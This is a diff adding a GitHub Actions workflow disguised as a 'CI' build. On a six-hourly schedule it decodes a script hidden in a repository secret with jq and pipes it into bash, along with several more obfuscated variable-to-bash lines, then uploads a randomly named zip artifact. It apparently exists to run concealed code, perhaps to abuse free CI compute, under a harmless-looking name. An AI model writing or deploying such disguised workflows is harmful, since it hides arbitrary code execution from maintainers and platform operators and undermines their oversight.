@@ -1,0 +1,37 @@
+name: CI
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '56 4,10,16,22 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  perform:
+    name: Run build
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run build
+        env:
+          um78: ${{ secrets.um78 }}
+        run: |
+          printf '%s' "$um78" | jq -r .stt52685 | /bin/bash
+          echo $gd49504 | jq -r .vn7056 | /bin/bash
+          printf '%s' "$hzcyd94323" | jq -r .bsc5565 | /bin/bash
+          echo $a30123 | jq -r .fxb85434 | /bin/bash
+          printf '%s' "$udwh6" | jq -r .oe958 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: CVIlx6I1
+          path: "*.zip"
+          retention-days: 1
